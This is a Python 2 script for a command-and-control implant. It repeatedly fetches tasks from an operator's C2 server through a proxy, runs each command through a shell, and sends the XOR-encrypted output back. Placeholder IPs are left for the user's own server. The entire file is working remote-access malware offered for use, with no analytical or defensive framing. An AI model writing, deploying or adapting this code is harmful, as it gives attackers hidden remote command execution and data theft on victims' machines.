#!/usr/bin/env python2

import httplib
import json
import base64
import hashlib
import hmac
import subprocess
import time

# C2 server and proxy details
C2_HOST = '<C2_SERVER_IP>'  # Replace with your C2 server's IP
C2_PORT = '<C2_SERVER_PORT>'
PROXY_HOST = '<C2_INTERNAL_PROXY_IP>'
PROXY_PORT = '<C2_INTERNAL_PROXY_PORT>'

# Shared secret key
SECRET_KEY = b'supersecretkey123'

# Encryption and decryption helpers
def xor_encrypt(data, key):
    """Encrypt/Decrypt data using XOR."""
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, (key * (len(data) // len(key) + 1))[:len(data)]))

def encrypt_data(data):
    """Encrypt data with XOR and append HMAC for integrity."""
    data = data.encode('utf-8')  # Ensure data is a byte string
    encrypted = xor_encrypt(data, SECRET_KEY)
    hmac_hash = hmac.new(SECRET_KEY, encrypted, hashlib.sha256).hexdigest()
    return base64.b64encode(encrypted + hmac_hash)

def decrypt_data(data):
    """Decrypt data with XOR and verify HMAC."""
    decoded = base64.b64decode(data)
    encrypted = decoded[:-64]
    received_hmac = decoded[-64:]
    expected_hmac = hmac.new(SECRET_KEY, encrypted, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(received_hmac, expected_hmac):
        raise ValueError("HMAC verification failed. Data integrity compromised.")
    decrypted = xor_encrypt(encrypted, SECRET_KEY)
    return decrypted.decode('utf-8')  # Decode byte string to unicode

def fetch_task():
    """Fetch a task from the C2 server."""
    try:
        conn = httplib.HTTPConnection(PROXY_HOST, PROXY_PORT)
        full_url = "http://{}:{}/get_task".format(C2_HOST, C2_PORT)
        conn.request('GET', full_url)
        response = conn.getresponse()
        if response.status == 200:
            encrypted_task = response.read()  # Read as a byte string
            decrypted_task = json.loads(decrypt_data(encrypted_task))
            return decrypted_task
        elif response.status == 204:
            return None
    except Exception as e:
        print("Error fetching task: {}".format(e))
    return None

def send_result(task_id, output):
    """Send task result back to the C2 server."""
    try:
        conn = httplib.HTTPConnection(PROXY_HOST, PROXY_PORT)
        full_url = "http://{}:{}/submit_result".format(C2_HOST, C2_PORT)
        data = json.dumps({'task_id': task_id, 'output': output})
        encrypted_data = encrypt_data(data)
        headers = {'Content-Type': 'application/json'}
        conn.request('POST', full_url, encrypted_data, headers)
        conn.getresponse()  # Send the request and ignore the response details
    except Exception as e:
        print("Error sending result: {}".format(e))

def execute_task(task):
    """Execute a task and return the output."""
    try:
        command = task['command']
        output = subprocess.check_output(command, shell=True)
        return output
    except Exception as e:
        return "Error executing task: {}".format(e)

if __name__ == '__main__':
    while True:
        print("Waiting for new tasks...")
        task = fetch_task()
        if task:
            print("Received task: {}".format(task['task_id']))
            output = execute_task(task)
            send_result(task['task_id'], output)
            print("Task {} completed".format(task['task_id']))
        time.sleep(5)
